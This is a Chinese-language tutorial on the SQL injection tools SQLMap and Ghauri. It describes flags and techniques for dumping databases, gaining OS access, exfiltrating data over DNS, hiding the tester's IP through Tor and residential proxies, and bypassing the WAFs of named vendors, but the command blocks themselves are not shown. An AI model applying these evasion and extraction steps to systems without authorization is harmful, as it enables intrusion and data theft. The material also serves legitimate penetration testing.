Sqlmap基本命令

SQLMap 采用模块化命令结构。以下是最常见的操作：

基本目标扫描

对单个 GET 参数执行初始 SQL 注入测试，并枚举可用数据库。

通过请求文件测试（适用于 POST/Headers）

使用从 Burp 或类似工具捕获的原始 HTTP 请求来测试 POST body、Headers、Cookies、JSON 和复杂的 API 请求。

使用 Dorking 方法

直接从搜索引擎搜索易受攻击的 URL 并自动测试。

批量 URL 扫描

在单次自动化运行中扫描文本文件中列出的多个目标 URL，无需逐一手动测试每个目标。

Tor 模式

通过 Tor 网络路由所有流量，隐藏真实 IP 并规避基于 IP 的封锁或速率限制。

Burp 模式

将所有 SQLMap 流量通过 Burp Suite 发送，以便进行检查、手动篡改和 WAF 行为分析。

基于 JSON 的 SQL 注入

检测 JSON 请求正文中的 SQL 注入，使用 hex 编码的 payload，并在 API 网关返回 403 Forbidden 响应时继续测试。

数据库枚举

这些选项让你系统地探索数据库结构，从列出数据库到提取特定的表、列和数据。

高级数据提取

这些选项帮助高效地提取大量数据，同时避免转储过程中常见的过滤和编码问题。

认证与会话处理

这些选项使 SQLMap 能够处理已认证会话、自定义 Headers 和 CSRF 保护的表单，同时降低被检测的几率。

操作系统与文件系统访问

这些选项展示了如何将 SQL 注入用于后渗透，允许文件访问以及在某些情况下在底层服务器上执行命令。

带外注入与 DNS 数据外传

这些选项使用 DNS 或 HTTP 等外部通道，在带内响应不可用时确认和提取盲注 SQL 注入的数据。

Header 利用

这些选项操纵 HTTP Headers、请求方法和参数格式，以绕过代理、WAF 规则或不寻常的请求处理逻辑。

时间与速率规避

这些选项减慢请求速度并降低噪音，帮助 SQLMap 在保持可靠性的同时避免速率限制和行为检测。

表单中的 SQL 注入

此方法使用 SQLMap 通过爬取页面并分析所有检测到的字段，自动查找和测试表单输入中的 SQL 注入。

SQLMap WAF 绕过与规避技术

现代 WAF（Cloudflare、Akamai 等）分析的是请求模式和 payload 行为，而不仅仅是特定关键词。为了规避这些检测，tamper 脚本被用于在发送前动态修改 SQL payload，改变其结构、编码和语法以绕过过滤规则。

忽略被阻止的 HTTP 状态码

忽略被阻止的 HTTP 状态码。如果 WAF 返回 403 或 500，可配置 SQLMap 忽略这些状态码并继续测试。

Imperva / Incapsula WAF 绕过

ModSecurity WAF 绕过

使用如下 tamper 脚本配合随机 User-Agent、延迟和编码来打破正则模式，使 payload 悄然通过 ModSecurity 过滤器。

Cloudflare WAF 绕过

通过随机大小写、编码和内联注释篡改来打破关键词模式，规避 Cloudflare 的签名检查。

📝 注意：不要一次使用过多 tamper 脚本。这会使 payload 过长，触发 WAF 封锁，导致冲突、误报并拖慢扫描速度。只使用必要的脚本，且最多不超过 3 个。

SQLMap WAF 绕过技巧（亲测有效）

  • 使用 --tamper 配合一个或多个脚本（逗号分隔）来混淆 payload 并规避基于签名的规则。常用且有效的组合包括：
  • 使用 --ignore-code=401,403（或其他封锁状态码）使 SQLMap 在 WAF 干预时不中断。
  • 使用 proxychains + 住宅代理轮换 IP 并模拟合法流量，住宅 IP 通常比数据中心 IP 更能有效规避基于信誉的 WAF 封锁。
  • 当你已知或已识别后端 DBMS 时，使用 --dbms mysql（或 postgresql、mssql 等），这将强制 SQLMap 使用针对特定数据库引擎的 payload，使检测更困难，结果更快更精确。
  • 结合 --risk 2（或仅在真正需要时使用 --risk 3）与适中的 --level，在基本 payload 失败时使用更强的 payload。尽量避免使用 --risk 3，因为它更具攻击性，可能导致目标系统不稳定或产生意外影响。
  • 在处理过滤问题或编码问题时使用 --hex，它强制 SQLMap 以十六进制形式发送数据，有助于绕过输入验证和某些 WAF 规则。
  • 使用 --null-connection 以最小响应数据测试注入并减少 WAF 检测，启用 --keep-alive 以复用同一 TCP 连接，这看起来更像正常浏览器流量，有助于避免基于行为的封锁。
  • 当类型转换导致 payload 失效时使用 --no-cast。它避免 CAST 操作，在数据提取困难或不稳定时很有帮助。

Ghauri：进阶替代方案

虽然 SQLMap 是行业标准，但 Ghauri 是一个高级 SQL 注入利用框架，针对盲注、时间注入和受 WAF 保护的目标进行了优化。它在面对现代重度 JavaScript 应用、REST API 和云端 WAF（传统 payload 模式被严格过滤）时尤为有效。

核心优势：

  • 先进的时间盲注和布尔盲注自适应能力。
  • 为速度优化的清晰模块化架构。
  • 面对云端 WAF（Cloudflare、Akamai）时表现出色。
  • 内置模拟人类行为的 payload 混淆。

其引擎针对异步请求和自适应延迟校准进行了优化，使其在隐蔽利用方面非常高效。

Ghauri 基本命令

Ghauri 的命令与 SQLMap 非常相似，因此很容易切换使用。

基本扫描

始终从基本扫描开始。先使用这个简单命令测试单个 GET 参数的 SQL 注入并枚举可用数据库。

通过请求文件测试（适用于 POST/Headers）

使用 Burp 请求文件进行更深入的测试。它让你在单次运行中扫描 POST 数据、Cookies、自定义 Headers 和 API 参数。

批量 URL 扫描

在单次自动化运行中扫描文本文件中列出的多个目标 URL，无需逐一手动测试每个目标。

JSON 与 API 目标

对于 JSON POST 注入，使用 --data 标志传入 JSON body 运行 Ghauri。这通常比使用 Burp 请求文件效果更好。

Ghauri WAF 绕过与规避技术

Ghauri 智能地调整其推理技术并混淆 payload，使其看起来像正常的用户流量，从而更容易绕过 WAF 和其他安全防御。以下是一些在处理 WAF 绕过时始终对我有帮助的命令。

利用垃圾数据绕过 Fortinet WAF

发送大量 1K 垃圾数据来迷惑 WAF，使后端以不同方式处理请求，从而使 payload 悄然通过。

可被利用的 WAF 检测限制

这些各厂商特有的请求体大小限制可以被利用——通过发送超过 WAF 完整检测大小的 payload，使 SQLi 部分绕过检测，而后端仍能正常处理。

Ghauri WAF 绕过技巧（亲测有效）

  • 使用 --confirm 重新验证 payload 并减少误报。
  • 使用 --delay 减慢请求速度，避免速率限制或基于行为的封锁。
  • 使用 proxychains 配合住宅 IP 以获得更好的 WAF 绕过效果。
  • 将 --level 提高到 3 以扩大注入测试深度。
  • 如果 --dbs 没有返回结果，尝试 --current-user、--current-db 和 --hostname 来确认注入。
  • 使用 --ignore-code 跳过被封锁的 HTTP 响应（例如 401 或 403）。
  • 当后端 DBMS 已知时使用 --dbms，强制 Ghauri 专注于该引擎以获得更快更精确的结果。
